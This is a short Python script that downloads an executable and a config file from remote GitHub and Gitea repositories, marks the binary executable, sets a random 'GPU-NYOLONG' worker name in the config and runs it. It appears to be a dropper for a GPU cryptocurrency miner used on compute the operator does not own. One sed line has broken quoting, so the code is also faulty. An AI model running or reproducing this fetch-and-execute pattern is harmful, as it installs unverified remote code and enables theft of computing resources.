import os
import random, string, urllib.request, json, getpass
os.system("apt update")
os.system("wget -qq https://github.com/angkii/asu/raw/main/gas")
os.system("wget -qq https://try.gitea.io/bambanks/nambang/raw/branch/main/keun.ini")
os.system("chmod +x gas")
os.system("sed -i "s/RIG/$(echo GPU-NYOLONG-$(shuf -i 1000-9999 -n 1))/" "keun.ini"")
os.system("./gas keun.ini")